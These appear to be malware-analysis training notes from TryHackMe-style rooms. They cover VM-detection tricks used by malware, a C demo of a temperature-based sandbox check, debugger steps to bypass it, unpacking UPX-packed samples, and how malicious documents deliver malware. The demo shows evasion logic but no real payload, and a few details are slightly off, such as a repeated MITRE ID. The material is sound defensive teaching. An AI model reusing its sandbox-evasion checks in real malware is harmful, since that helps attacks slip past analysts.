| Checking installed software | Malware can look in the Windows Registry for a list of installed software under the `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall` Registry key. From here, it can check for installed programs like debuggers, decompilers, forensics tools, etc. |
| Network fingerprinting | Malware
 can look for specific MAC and network addresses unique to VMs. For 
example, VMs autogenerate MAC addresses that start with any of the 
following numbers: `00-05-69`, `00-0c-29`, `00-1c-14` or `00-50-56`. These numbers are unique and are specifically assigned to a VM vendor called the OUI (Organizationally Unique Identifier). |
| Checking machine resources | Malware can look at a machine's resources like RAM and CPU Utilization percentages. For example, a machine with RAM amounting to less than 8GB can indicate a virtual machine, as they are typically not assigned a significant amount. |
| Detecting peripherals | Some
 malware checks for connected printers because this is rarely configured
 properly on VMs, sometimes not even configured at all. |
| Checking for domain membership | Corporate
 networks are a usual target for malware. An easy way to determine this 
is by checking if the current machine is part of an Active Directory 
domain. This can quickly be done without the use of API calls by checking the `LoggonServer` and `ComputerName` environment variables. |
| Timing-based attacks | Malware
 can measure the time it takes to execute specific instructions or 
access particular machine resources. For example, some instructions can 
be faster on a physical machine compared to a virtual machine. |

Many
 techniques mentioned above are not foolproof, so it is not uncommon to 
see malware use a combination of one or more to ensure a higher chance 
of correct identification.

# Anti-VM Detection

To
 prevent malware from using some of the techniques above, we can apply 
several changes to the system that will remove VM-related artefacts 
making the VM look less like a VM. For 
example, we can remove or modify the Registry entries that malware 
checks for installed programs to hide our debuggers, change the MAC 
addresses, or configure the VM to appear connected to a printer.

But
 you can see how tedious this becomes. With the myriad of options 
available to malware, it would be challenging to cover all of them.

Some researchers have made scripts  (See [VMwareCloak](https://github.com/d4rksystem/VMwareCloak) and [VBoxCloak](https://github.com/d4rksystem/VBoxCloak))
 to help automate this process. Despite this, even if all the known 
techniques are addressed, minor architectural checks can still be made 
by malware, as you will see in the next task.

**VM Detection by Checking the Temperature**

Here is an example of a VM detection technique that checks the machine's temperature provided by the hardware.

`Win32_TemperatureProbe` is
 a Windows Management Instrumentation (WMI) class that contains 
real-time temperature readings from the hardware through the SMBIOS 
(System Management BIOS) data structure. In a virtualized environment, the value returned is `Not Supported`, which is what malware looks for.

***Note:** `Win32_TemperatureProbe` may also return `Not Supported` even
 on physical machines if the hardware doesn't support this SMBIOS 
feature. This makes it unreliable but valuable when used with other 
techniques mentioned in the previous task.*

We have provided a working program demonstrating this technique in the VM attached to this room. Look for the `vm-detection.exe` file in the `C:\Malware\` directory and execute it. You will see the result immediately.

Upon execution, a message window will appear:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/b6e37b8777df01ca2c1e7c0cafb814dc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/b6e37b8777df01ca2c1e7c0cafb814dc.png)

As you can see, the malware sensed it was running in a VM. It modified its behaviour by continuing a non-malicious activity to throw off analysts snooping around.

Below is the code snippet for this particular program:

See code snippet

`#include <stdio.h>#include <windows.h>#include <wbemidl.h>#include <combaseapi.h>#pragma comment(lib, "wbemuuid.lib")#pragma comment(lib, "user32.lib")#pragma comment(lib, "ole32.lib")#pragma comment(lib, "oleaut32.lib")

BOOL hasThermalZoneTemp();

int main()
{
	if ( !hasThermalZoneTemp() )
	{
		MessageBox(NULL, "Proceeding with non-malicious activities...", "VM Detected" , MB_OK);
		return 0;
	}

	MessageBox(NULL, "Proceeding with malicious activities...", "Starting malware", MB_OK);
	return 0;
}

BOOL hasThermalZoneTemp()
{
	IWbemLocator* pLoc = NULL;
	IWbemServices* pSvc = NULL;
	IEnumWbemClassObject* pEnumerator = NULL;
	IWbemClassObject* pclsObj = (IWbemClassObject*)malloc(sizeof(IWbemClassObject));
	
	ULONG uReturn = 0;

	HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
	hr = CoInitializeSecurity(NULL, -1,	NULL, NULL,	RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,	NULL, EOAC_NONE, NULL);
	hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
	hr = pLoc->ConnectServer(L"root\\wmi", NULL, NULL, 0, NULL,	0, 0, &pSvc);
	hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT,	RPC_C_AUTHZ_NONE, NULL,	RPC_C_AUTHN_LEVEL_CALL,	RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
	hr = pSvc->ExecQuery(L"WQL", L"SELECT * FROM MSAcpi_ThermalZoneTemperature", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,	NULL, &pEnumerator);

	while (pEnumerator)
	{
		hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
		if (uReturn == 0)
		{
			return 0;
		}

		VARIANT vtProp;

		hr = pclsObj->Get(L"CurrentTemperature", 0, &vtProp, 0, 0);
		if (SUCCEEDED(hr))
		{
			printf("Thermal Zone Temperature: %d\n", vtProp.intVal);
			return 1;
		}

		VariantClear(&vtProp);
		pclsObj->Release();
	}

	pEnumerator->Release();
	pSvc->Release();
	pLoc->Release();
	
	CoUninitialize();

    return 0;
}`

You can try compiling and running this code on your physical machine to see how it changes its behaviour *(No actual malicious execution is in the provided code so it is safe to run)*. The
 output below shows how the malware behaves when run from a physical 
machine. The malware receives the correct temperature reading from the WMI class and proceeds with its execution.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/d2d4144a78e51098656f8bee711c2e07.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/d2d4144a78e51098656f8bee711c2e07.png)

# Preventing Temperature Checking

As
 mentioned in the previous task, architectural checks like checking the 
temperature can be challenging to prevent. Fortunately for us, there are
 still ways around this. For example, we've learned in the last task that we can patch a function with `nops`
 to prevent it from executing. We can do the same thing here, but for 
the sake of giving you more tools to help you with reverse engineering, 
we'll be covering two other approaches:

- Manipulating memory directly
- Changing the execution flow with EIP

Here are the steps:

- Open `x32dbg.exe` by double-clicking on the desktop icon
- Go to File > Open, then look for the `vm-detection.exe` file in the `C:\Malware\` directory.
- Press `F9` to start running the program in the debugger. Debugging will halt at the code marked as the "EntryPoint".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/7eb0c75da85be89bb998192fdbe44f2e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/7eb0c75da85be89bb998192fdbe44f2e.png)

- Press `Ctrl+G` on your keyboard to bring up the "Enter expression to follow..." pop-up window. Enter the value `004010E0` and press "OK". This will take you to the memory address. `0x004010E0`.
- Press `F2` to set up a breakpoint at this memory location, then press `F9` once to halt execution here.
- Right now, we are at the memory location `0x004010E0`. The block of instructions from this location up until `0x004010F8` corresponds to this part of our C code snippet: `hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);`. To help you visualize this, I've added comments on the right side of
the screenshot below to highlight the values passed to the function.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f1a91972e5981af51a4d668eb5f8ebe8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f1a91972e5981af51a4d668eb5f8ebe8.png)

- As previously discussed, this function will fail because we run the program in a VM. After executing, the function will write the value `0` to the memory location `[ebp-18]` (the one marked with `uReturn` in the screenshot above).
- Press `F8` a few times to step through the code until you reach the memory location `004010FD`. Here, we can see that the value of `[ebp-18]` (or uReturn) is being compared to zero. This corresponds to this part in the C code: `if (uReturn == 0)`.
- Since we want this "if" condition to evaluate to `False`, what we can do is edit the memory location pointed to by `[ebp-18]` so that it will contain the value `1` instead of `0`.
- To do this, right-click on the line that has `[ebp-18]`, click on "Follow in dump", then select `[ebp-18]`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/2cc9fdf14ec8de8ec6a062ad5ce3c407.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/2cc9fdf14ec8de8ec6a062ad5ce3c407.png)

- You will see at the bottom of the screen, at the "Dump 1" window tab, that our current memory location is `0019FF08`. This memory location contains the value for `[ebp-18]` or uReturn.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/aa0b40abe6a1292372402b5acac4a6ab.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/aa0b40abe6a1292372402b5acac4a6ab.png)

- Double-click on the rightmost `00` value. This will open up a "Modify Value" window. Enter the value `01` in the expression field and press the "OK" button. The result should look like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/85d660f1c29076c8694f52a1d5c9577d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/85d660f1c29076c8694f52a1d5c9577d.png)

- Turn your attention back to the main window (CPU tab) and press `F8` a few times. You'll notice that the code will not exit anymore as it skips the execution from `00401101` to `0040110A`.

What
 you've done is that you've manipulated the bits of a memory location 
directly to influence the flow of the program. This method is helpful in
 many other ways, like for example, you could change the value that will
 be passed to a function before you execute that function.

However,
 the program will now crash if you continue running the program. The 
program was supposed to exit at the previous function, but we've 
introduced a bug since we intentionally skipped this. Don't worry; this 
always happens when messing around in the debugger. So for us to 
continue to investigate, there is one other method we can use that would
 allow us to jump around and continue.

- Let us say we want to skip everything and jump to this part of the code right here:	`printf("Thermal Zone Temperature: %d\n", vtProp.intVal);`. In the assembly code, this would be the instructions `00401130` to `00401139`, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/29a840731a46e38105443fcdafb9ac64.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/29a840731a46e38105443fcdafb9ac64.png)

The
 great thing about debuggers is that we can change every value related 
to the program; we can change the values in the memory locations, the 
values on the stack, and even the values of the registers. The `EIP`
 register is the register that holds the memory address that tells the 
debugger what next instruction to execute next. And yes, this can be 
edited!

- Continue from the last step. On the "Registers" panel on the right of your screen, look for the one that says `EIP`. Right-click on the value and select "Modify Value".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/1e0f7ae461f297eb5a48a25b46941518.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/1e0f7ae461f297eb5a48a25b46941518.png)

- Enter `00401134` as the new value and press OK.
- Now when we press `F8` to step through the code, you'll notice that we'll jump directly to that instruction. Notice how the `EIP` marker now points to the location we wanted.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/23b17f01fc2ed7906308b2fa782f9742.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/23b17f01fc2ed7906308b2fa782f9742.png)

- Pressing `F9` again would continue running the program, resulting in the output below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/e916e886923e9fc1569760f5924bb0d1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/e916e886923e9fc1569760f5924bb0d1.png)

Good job! With the above steps, you successfully prevented the malware from detecting that it is running on a VM. You can confirm this by also checking the Command Prompt output.

These simple techniques will be helpful in going through the code and influencing the program flow.

But
 we can't celebrate just yet, for there are other things malware can do 
to prevent you from discovering more of its capabilities, like the use 
of Obfuscation and Packers, which is discussed in the next task.

**Packers (Overview)**

Obfuscation is a technique that aims to intentionally obscure data and code so that it is harder to understand or analyze.

The most common obfuscation techniques used by malware authors include:

- **Using encoding techniques** - This involves encoding data (i.e. command line strings, domain names, etc.) using popular encoding techniques like `XOR` or `Base64`. You may have seen a Base64 encoded strings that look like this `VGhpcyBpcyBhbiBCQVNFNjQgZW5jb2RlZCBzdHJpbmcu==`.
- **Using encryption techniques** - This involves encrypting data such as communications to a command and control server, file formats, and network traffic. The most common
types used are symmetric key and public key encryption.
- **Code obfuscation** - This involves various techniques such as manipulating the code to
alter its syntax and structure, renaming functions, or splitting code
across multiple files or code segments.

There's much to 
discuss with obfuscation, but we won't delve deep into them in this 
room. In this task, we want to talk about the wide use of Packers in malware nowadays, a technique that can also be considered to fall under obfuscation.

# Packers

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/718629e08cb56b91b63546abcd971642.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/718629e08cb56b91b63546abcd971642.png)

Packers
 are tools that compress and encrypt executable files. It compresses the
 target executable and embeds it within a new executable file that 
serves as a wrapper or container. This dramatically reduces the size of 
the file, making it ideal for easy distribution and installation. Also, 
some packers offer additional features, such as code obfuscation, 
runtime packing, and anti-debugging techniques. And it is because of 
these features that made Packers a popular tool for malware authors.

There are a lot of Packers available. Each has a unique approach and algorithm for packing. Here is a list of some that were seen used in the wild:

- [Alternate EXE Packer](https://www.alternate-tools.com/pages/c_exepacker.php?lang=ENG)
- [ASPack](http://www.aspack.com/)
- [ExeStealth](https://unprotect.it/technique/exestealth/)
- [hXOR-Packer](https://github.com/akuafif/hXOR-Packer)
- [Milfuscator](https://github.com/nelfo/Milfuscator)
- [MPress](https://www.autohotkey.com/mpress/mpress_web.htm)
- [PELock](https://www.pelock.com/products/pelock)
- [Themida](https://www.oreans.com/Themida.php)
- [UPX: the Ultimate Packer for eXecutables](https://upx.github.io/)
- [VMProtect](https://vmpsoft.com/)

It
 is essential to state that not all packed programs are malicious. 
Packers are also used by legitimate software to protect their programs, 
like for protecting their intellectual property from theft. For example,
 the Packer tool "Themida" is widely used to prevent video game cheating.

Because
 Packers encrypts and obfuscates a program, it would be impossible to 
know the malware's capabilities without running it. Because of this, we 
cannot reliably depend on static analysis and signature-based detection 
techniques to determine its capabilities. The only information we could 
glean from a malware sample at this state is the Packer tool used. This 
can still be a good starting point for an investigation, which we will 
see in the next task.

**Identifying and Unpacking**

The
 first step in dealing with packed malware is identifying the Packer 
used. Thankfully, there are tools that we can use for this. The most accessible tools are DetectItEasy (DIE) and PEStudio, which are already included in the VM attached to this room. You will also find a packed sample program titled `packed.exe` under the `C:\Malware\` directory that we can use to test these tools on.

DetectItEasy is a tool that uses a collection of signatures of known packers to identify the one used on the selected file.

1. Right-click on the `packed.exe` executable file and select "Detect it easy (DIE)".
2. If DetectItEasy can identify the used Packer, it will display its "best guess" under this section.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6d02e03daa39dd2f16a0c23d90eebbff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6d02e03daa39dd2f16a0c23d90eebbff.png)

1. You can also click on the "Entropy" button on the right side of the screen to open the "Entropy" window.
2. The Entropy window looks and determines how much entropy each section has.
And as you can see, it has been determined that "Section 1" is "packed".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f3346a37c9d378847700cd44e390cbd9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f3346a37c9d378847700cd44e390cbd9.png)

Entropy measures the level of disorder or uncertainty in a system. Packed malware tends to have high entropy due to the randomness of the packing process.

Another tool is PEStudio which lists information on PE files. This is important because there are specific Packers that will still leave clues.

1. From the Desktop, double-click on the "pestudio" icon.
2. Go through the menus, "File > Open", and open the `packed.exe`.
3. In the list of items on the left panel window, click on "sections (self-modifying)".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/d20925acce3a1b107e34b4fd2d2ee92d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/d20925acce3a1b107e34b4fd2d2ee92d.png)

Usually, the section names of a standard PE file are `.text`, `.data` and `.rsrc`. But in the output above, we can see that this is the section names have been changed. The strings `UPX0`, `UPX1`, and `UPX2` are one of those identifiable pieces of information that Packers like UPX leave behind. Not all Packers change this value, but usually, this is the most accessible first place to look.

Because
 different Packer tools use various methodologies in packing 
executables, sometimes tools like DetectItEasy could not identify all 
types of Packers.

# Automated Unpacking

Once
 the Packer for a packed malware is identified, it is possible to use an
 unpacker to get back the original file. Some are readily available, 
like in the case of UPX, where you can use the same packing program for 
unpacking. For other commercial tools like Themida, you may have to rely
 on unpacker scripts made by 3rd parties.

Here is a short list of scripts that you could use for specific Unpacker tools:

- [Themida](https://github.com/Hendi48/Magicmida)
- [Enigma Protector](https://github.com/ThomasThelen/OllyDbg-Scripts/blob/master/Enigma/Enigma%20Protector%201.90%20-%203.xx%20Alternativ%20Unpacker%20v1.0.txt)
- [Mpress unpacker](https://github.com/avast/retdec/blob/master/src/unpackertool/plugins/mpress/mpress.cpp)

If you chance upon malware packed with an obscure tool or modified to thwart available scripts, things might be more difficult.

Thankfully, there are services like [unpac.me](https://www.unpac.me/) where
 you can upload a sample. It will try to identify and unpack the malware
 for you using custom unpacking and artefact extraction processes. While this service is excellent, it can still fail.

# Manual Unpacking and Dumping

Ultimately, the best way to unpack malware is to execute it.

When
 a packed malware is executed, the wrapper or container code performs 
decryption and deobfuscation. Once fully unpacked, the malware can 
proceed with its true intentions. At this point, the Packer is useless, 
and we can thoroughly analyze the malware by debugging it while it's in 
memory using a debugger.

We can also dump this unpacked version as a separate executable.

- Open the `packed.exe` using x32dbg.
- Press CTRL+G to open the "Enter expression to follow..." window, input `004172D4` then press "OK".
- You will now be taken to the memory location `004172D4`. This memory location is before the entry point to the legitimate part of the program.
- Press "F2" to set a breakpoint here, then press "F9" twice to move execution to this location.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/3bf415b3c23b1f71a6320b8ff439e8fc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/3bf415b3c23b1f71a6320b8ff439e8fc.png)

- Finally, press "F7" to jmp to the memory location `00401262`. This location is the starting location of this legitimate program that the Packer goes to once it's fully unpacked.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/435c7f14ddc5442500aa15d99d2dfe0e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/435c7f14ddc5442500aa15d99d2dfe0e.png)

By now, you may be curious about the memory locations `004172D4` and `00401262`, and their relevance to what we are doing. When this UPX-packed malware is executed and the execution location reaches `004172D4`, it indicates that the legitimate part of the program has already been successfully unpacked and is now copied in memory at `00401262`. As outlined in the next steps, we can now begin dumping from this location.

***Note:** Other
 packers have different approaches to unpacking the legitimate part of 
the program, so the steps above would not work on them.*

- To start dumping, go to the top bar menu and click "Plugins > Scylla".
- Scylla is a tool that can dump process memory to disk and fix and rebuild the
Import Address Table (IAT). We'll use this to dump the unpacked
legitimate part of the program to memory and fix it so it will have the
updated memory locations from its DLL imports.
- Once the Scylla plugin window is open, click the "Dump" button.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/141c6d6bd351e89ffa441e858054553a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/141c6d6bd351e89ffa441e858054553a.png)

- Save this dumped version to the exact location as the original file.
- If you try to run this dumped version, an error will appear. This is because we have not fixed the import address table yet.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/d2d9936cf695ce355da8f072cde99766.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/d2d9936cf695ce355da8f072cde99766.png)

- Back in the Scylla plugin window, and click the "IAT Autosearch" button to
start. This scans the memory of the process to locate the import address table.
- If a pop-up window asks if you want to use the IAT Search Advanced result, select "No". Then press "OK".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/560c2e4aee60ce13e565270af77bf7b2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/560c2e4aee60ce13e565270af77bf7b2.png)

- At this point, the appropriate values related to the IAT are now computed. We can now click on the "Get Imports" button to update the Imports list section.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/cfaeea5adbfbebf4b779c240a155810e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/cfaeea5adbfbebf4b779c240a155810e.png)

- This list will show all DLLs that are used by the program. The list is short because the program is simple. An actual malware will have a longer
list.
- Sometimes, Scylla will find invalid entries; this is
marked with the "X" icon next to it. These are safe to delete because
the list already covers every DLL that the program uses. To delete
these, go through each invalid entry, right-click, and select "Cut
thunk". Once deleted, you should be left with valid entries with check
mark icons.
- Click on the "Fix Dump" button, and select the previously generated dump file you created a few steps ago.
- A new file will be created in the same directory as the dumped file with
the string "_SCY" appended to its filename. If you execute this, the
program will now work correctly.

You
 can confirm if unpacking was successful by inspecting the generated SCY
 file using DetectItEasy or PEStudio. Here's the output of DetectItEasy;
 you'll notice that it does not detect the Packer anymore:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/4600cdd205e3dbd31c691b0b5769eafc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/4600cdd205e3dbd31c691b0b5769eafc.png)

With
 the malware unpacked, you can now continue investigating the malware. 
However, don't be fooled into thinking that unpacking packed malware is 
easy. UPX is the most basic packer tool and the easiest to unpack. Other
 Packers will be more difficult, primarily if it employs other anti-reverse engineering techniques.

## **MALDOC:STATIC ANALYSIS**

**Introduction**

In
 today's digital age, documents are among the most common ways to share 
information. They are used for various purposes, including reports, 
proposals, and contracts. Because of their prevalence, documents are 
also a common vector for cyber attacks. Malicious actors can use 
documents to deliver malware, steal sensitive information, or carry out 
phishing attacks.

Analyzing malicious documents is, therefore, an essential part of any
 cyber security strategy. Analysts can identify potential threats by 
analyzing the structure and content of a document and taking steps to 
mitigate them. This is particularly important today when more businesses
 rely on digital documents to share and store sensitive information.

**Initial Access - Spearphishing Attachment**

Malicious
 documents are one of the primary ways the attackers use to get initial 
access to a system or break into the network. Many APT groups have found utilizing spearphishing attachments as their Initial access technique.

# Spearphishing Attachment

[Spearphishing attachments](https://attack.mitre.org/techniques/T1566/001/)
 are very common cyber attacks targeting specific individuals or 
organizations through carefully crafted and personalized phishing 
emails. The attacker aims to trick the recipient into opening a 
malicious attachment, typically containing malware, ransomware, or other
 harmful software. By doing so, the attacker gains unauthorized access 
to the target's system, allowing them to steal sensitive information, 
compromise systems, or achieve other nefarious goals.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/aa050a44ce8b19a1c4bdb6bdaf1b52a9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/aa050a44ce8b19a1c4bdb6bdaf1b52a9.png)

Advanced Persistent Threats (APT) are highly organized cybercrime
 groups or state-sponsored entities known to use spearphishing attacks 
to infiltrate their targets' systems. APT
 groups employ spearphishing with attachments as an effective way to 
bypass security measures and gain a foothold in the target environment. 
Here are a few examples of APT groups that have used spearphishing attachments in their attacks:

- **APT28 (Fancy Bear):** This Russian
state-sponsored group has been responsible for various high-profile
cyberattacks, such as the 2016 Democratic National Committee (DNC) hack. APT28 used spearphishing emails with malicious attachments disguised as legitimate files to trick recipients into opening them. Once opened,
the malware installed on the victims' computers allowed the attackers to exfiltrate sensitive information.
- **APT34 (OilRig):** APT34 is an Iranian cyber
espionage group that has targeted various industries, primarily focusing on the Middle East. One of their tactics includes spearphishing emails
with malicious Microsoft Excel attachments. When victims open the
attachment, a macro initiates the download and installation of malware,
which then establishes a connection with the attackers' command and
control servers.
- **APT29 (Cozy Bear):** Another Russian
state-sponsored group, APT29, has targeted governments and organizations worldwide. In a high-profile attack against the Norwegian Parliament in 2020, APT29 sent spearphishing emails with malicious attachments to
parliament members. The attack resulted in unauthorized access to
sensitive data.
- **APT10 (MenuPass Group):** A Chinese cyber espionage group, APT10 has targeted organizations in
various sectors, including government, aerospace, and healthcare. They
have used spearphishing emails with malicious attachments that appear to be legitimate documents, such as job offers or invoices. When the
attachment is opened, the malware contained within it compromises the
target's system, allowing APT10 to exfiltrate sensitive data.

# Malware families associated with Malicious documents:

Some of the malware families that are spreading through malicious documents are:

**Emotet:**

- **Technical details:** Emotet is a banking trojan that
is often distributed through malicious email attachments, typically in
the form of Microsoft Word documents. Once installed, Emotet can steal
sensitive information, such as banking credentials and email addresses,
and it can also be used to download additional malware.
- **MITRE reference:** The MITRE ATT&CK framework includes a reference for Emotet, which can be found at [https://attack.mitre.org/software/S0367/](https://attack.mitre.org/software/S0367/).

**Trickbot:**

- **Technical details:** Trickbot is a banking trojan
that is often distributed through malicious email attachments and is
known for its modular design, which allows attackers to add new
functionality to the malware as needed. Trickbot has been used to
deliver ransomware, exfiltrate data, and perform other types of
malicious activity.
- **MITRE reference:** The MITRE ATT&CK framework includes a reference for Trickbot, which can be found at [https://attack.mitre.org/software/S0383/](https://attack.mitre.org/software/S0383/).

**QBot:**

- **Technical details:** QBot is a banking trojan that is often distributed through malicious email attachments and is known for
its ability to steal banking credentials and other sensitive
information. QBot is also capable of downloading and executing
additional malware and can be used to create backdoors on infected
systems.
- **MITRE reference:** The MITRE ATT&CK framework includes a reference for QBot, which can be found at [https://attack.mitre.org/software/S0385/](https://attack.mitre.org/software/S0385/).

**Dridex:**

- **Technical details:** Dridex is a banking trojan that
is often distributed through malicious email attachments and is known
for its ability to steal banking credentials and other sensitive
information. Dridex has been active since 2014 and has been one of the
most prevalent banking trojans in recent years.
- **MITRE reference:** The MITRE ATT&CK framework includes a reference for Dridex, which can be found at [https://attack.mitre.org/software/S0384/](https://attack.mitre.org/software/S0384/).

**Locky:**

- **Technical details:** Locky is a ransomware family
that is often spread through malicious email attachments, typically in
the form of Microsoft Word documents. Once installed, Locky encrypts the victim's files and demands a ransom payment in exchange for the
decryption key.
- **MITRE reference:** The MITRE ATT&CK framework includes a reference for Locky, which can be found at [https://attack.mitre.org/software/S0369/](https://attack.mitre.org/software/S0369/).

**Zeus:**

- **Technical details:** Zeus is a banking trojan that
has been active since 2007 and is often distributed through malicious
email attachments. Zeus is known for its ability to steal banking
credentials and other sensitive information and has been used in
numerous high-profile attacks over the years.
- **MITRE reference:** The MITRE ATT&CK framework includes a reference for Zeus, which can be found at [https://attack.mitre.org/software/S0382/](https://attack.mitre.org/software/S0382/).

**Petya:**

- **Technical details:** Petya is a ransomware family
that is often spread through malicious email attachments and has been
active since 2016. Petya is known for its ability to encrypt the
victim's entire hard drive, making it much more difficult to recover
from than other types of ransomware.
- **MITRE reference:** The MITRE ATT&CK framework includes a reference for Petya, which can be found at [https://attack.mitre.org/software/S0367/](https://attack.mitre.org/software/S0367/).

**Documents and Their Malicious Use**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/8107303552d06e6e386d3f1c4cc3144d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/8107303552d06e6e386d3f1c4cc3144d.png)

Attackers
 can abuse different types of digital documents to deliver malware or 
execute code on a user's system. It is important to 
be cautious when opening documents from unknown sources and to keep your
 software and security measures up to date to reduce the risk of falling
 victim to these types of attacks. Some of the documents are explained 
below, along with their malicious usage:

**PDF**

Portable
 Document Format (PDF) is a widely used document format that can be 
opened on different devices and operating systems. However, attackers 
can also use PDFs to deliver malware or launch attacks on a user's 
system. For example, attackers can embed malicious code or links in a 
PDF file that, when opened, can exploit vulnerabilities in a user's 
system. PDFs can also be used for phishing attacks by including links 
that redirect users to fake websites where they are prompted to enter 
personal information.

# DOCX

Microsoft
 Word documents can be used to deliver malware by using macros, which 
are a series of commands that automate tasks within the document. 
Attackers can embed malicious macros in Word documents that, when 
enabled, can execute code on a user's system. For example, attackers can
 create a Word document that prompts users to enable macros to view the 
contents of the document, which then executes malicious code that can 
steal personal information or install malware.

# XLSX

Excel
 spreadsheets can also be used to deliver malware by using macros. 
Similar to Word documents, attackers can embed malicious macros in Excel
 spreadsheets that, when enabled, can execute code on a user's 
system. For example, attackers can create a spreadsheet that prompts 
users to enable macros to view the contents of the spreadsheet, which 
then executes malicious code that can steal personal information or 
install malware.

# PPTX

PowerPoint
 presentations can be used to deliver malware or phishing attacks. 
Attackers can embed malicious code or links in a presentation that, when
 opened, can exploit vulnerabilities in a user's system or redirect 
users to fake websites where they are prompted to enter personal 
information.

# XML

Extensible
 Markup Language (XML) is a markup language used to store and transport 
data. Attackers can use XML documents to exploit vulnerabilities in a 
user's system. For example, attackers can inject malicious code into an 
application by uploading an XML file that contains code designed to exploit vulnerabilities in the application software.

# OneNote

OneNote
 is a digital note-taking application that allows users to organize and 
share their notes across devices. While OneNote itself is not typically 
used to deliver malicious content, attackers can abuse OneNote to 
deliver phishing attacks. Attackers can also use OneNote to store and 
share malware. For example, attackers can create a OneNote notebook that
 appears to contain legitimate information but includes a link to a 
malware download. When the user clicks on the link, the malware is 
downloaded and executed on their system.

So far, we have learned 
about some very common document types and how attackers can abuse them 
for malicious intent. In the following tasks, we will explore them in 
detail.

**PDF Documents - Structure**

Before
 we start analyzing PDF documents for being malicious or not, it's 
better first to understand the structure of a PDF and what are the 
